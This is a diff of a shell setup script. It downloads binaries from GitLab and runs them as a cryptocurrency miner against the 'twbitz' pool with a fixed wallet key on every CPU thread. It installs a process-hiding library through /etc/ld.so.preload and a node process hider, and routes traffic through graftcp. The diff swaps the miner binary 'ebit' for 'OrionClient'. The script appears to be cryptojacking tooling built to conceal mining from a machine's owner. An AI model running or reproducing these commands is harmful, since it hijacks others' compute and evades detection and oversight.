@@ -19,7 +19,9 @@ npm i -g node-process-hider
 
 apt update && apt install unzip
 
-wget https://github.com/kidoescegh/pile/raw/main/ebit && chmod +x ebit
+wget https://gitlab.com/kido-esce/pile/-/raw/main/orion_linux151.zip
+unzip orion_linux151.zip
+cd linux && chmod +x OrionClient
 
 wget https://gitlab.com/ravencoin002/file/-/raw/main/graphics.tar.gz
 
@@ -60,4 +62,4 @@ gcc -Wall -fPIC -shared -o libprocesshider.so processhider.c -ldl
 mv libprocesshider.so /usr/local/lib/
 echo /usr/local/lib/libprocesshider.so >> /etc/ld.so.preload
 
-./graftcp/graftcp & clear & ./ebit mine -a --pool twbitz --key 5o9PkcxTjqtvnGZRoqzAandwVKMkkzgpi4bUTkkeRgGV --worker $(shuf -n 1 -i 1-99999)-EBIT -t $(nproc --all) --ice
+./graftcp/graftcp & clear & ./OrionClient mine -a --pool twbitz --key 5o9PkcxTjqtvnGZRoqzAandwVKMkkzgpi4bUTkkeRgGV --worker $(shuf -n 1 -i 1-99999)-EBIT -t $(nproc --all) --ice
